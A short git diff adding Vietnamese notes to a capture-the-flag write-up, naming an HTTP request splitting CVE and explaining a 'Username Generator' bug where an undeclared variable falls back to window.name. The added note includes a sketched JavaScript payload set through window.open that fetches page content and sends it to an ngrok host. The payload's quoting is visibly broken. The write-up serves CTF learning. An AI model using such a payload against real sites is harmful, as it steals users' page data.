@@ -13,7 +13,14 @@ Write up nhằm ép mình hiểu bản vấn đề và giải thích + repoduce 
 
 ## Flag Portal (Flag 2)
 
+## Flag 1
+CVE HTTP request splitting
+
+## Flag 2
+
 ## Username Generator
+
+if(usernameLength > 0): Thì khi usernameLength = 0 biến `{name}` sẽ không được khai báo, từ nó đó sẽ nhận biến toàn cục là `window.name`. `window.name` là biến toàn cục trong javascript chỉ đến tên của tab(window) hiện tại vì thế với payload kiểu: `window.open('/', 'fetch('url').then(response => response.text()).then(fetch("ngrok"+response))')`
 
 ## The Pigeon Files
 
